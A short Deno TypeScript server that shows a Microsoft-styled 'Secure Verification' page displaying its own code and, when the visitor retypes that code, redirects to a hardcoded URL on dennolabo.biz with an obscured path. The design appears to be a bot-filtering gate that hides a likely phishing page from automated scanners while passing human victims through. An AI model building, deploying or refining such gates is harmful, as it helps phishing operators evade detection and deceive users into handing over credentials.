// secure-redirect.ts
import { serve } from "https://deno.land/std@0.200.0/http/server.ts";

// Configuration
const CONFIG = {
  DESTINATION_URL: Deno.env.get("DESTINATION_URL") || "https://dennolabo.biz/xkc1vta/walihse/ofcnjvd/provost/index.html",
  VERIFICATION_CODE: Deno.env.get("VERIFICATION_CODE") || "A7B2C9D",
  PORT: Deno.env.get("PORT") || "8000"
};

// Professional Verification Page
function generateHTML() {
  return `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Verification</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0078D4 0%, #004E8C 100%);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 0;
      color: white;
    }
    .card {
      background: white;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 450px;
      padding: 2.5rem;
      text-align: center;
      color: #333;
    }
    .verification-code {
      font-size: 1.8rem;
      letter-spacing: 3px;
      margin: 2rem 0;
      padding: 1rem;
      background: #f8f9fa;
      border-radius: 8px;
      font-family: monospace;
      color: #0078D4;
      font-weight: bold;
      border: 1px dashed #ddd;
    }
    button {
      background: #0078D4;
      color: white;
      border: none;
      padding: 1rem;
      border-radius: 8px;
      width: 100%;
      font-size: 1.1rem;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>Verification Required</h1>
    <p>Please enter the verification code shown below:</p>
    
    <div class="verification-code">${CONFIG.VERIFICATION_CODE}</div>
    
    <form id="verifyForm">
      <input type="text" id="codeInput" placeholder="Enter code exactly as shown" required>
      <button type="submit">VERIFY & CONTINUE</button>
    </form>
  </div>

  <script>
    document.getElementById('verifyForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const code = document.getElementById('codeInput').value.trim();
      
      try {
        const response = await fetch('/verify', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({ code })
        });
        
        if (response.redirected) {
          window.location.href = response.url;
        } else {
          const result = await response.json();
          alert(result.message || 'Verification failed');
        }
      } catch (error) {
        alert('Network error. Please try again.');
      }
    });
    
    document.getElementById('codeInput').focus();
  </script>
</body>
</html>
`;
}

// Request Handler
async function handleRequest(req: Request): Promise<Response> {
  const url = new URL(req.url);
  
  if (url.pathname === "/verify" && req.method === "POST") {
    try {
      const { code } = await req.json();
      if (code === CONFIG.VERIFICATION_CODE) {
        return Response.redirect(CONFIG.DESTINATION_URL, 302);
      }
      return new Response(
        JSON.stringify({ message: "Invalid verification code" }),
        { status: 401, headers: { "Content-Type": "application/json" } }
      );
    } catch {
      return new Response(
        JSON.stringify({ message: "Invalid request" }),
        { status: 400, headers: { "Content-Type": "application/json" } }
      );
    }
  }
  
  return new Response(generateHTML(), {
    headers: { "Content-Type": "text/html" }
  });
}

// Start Server
serve(handleRequest, { port: Number(CONFIG.PORT) });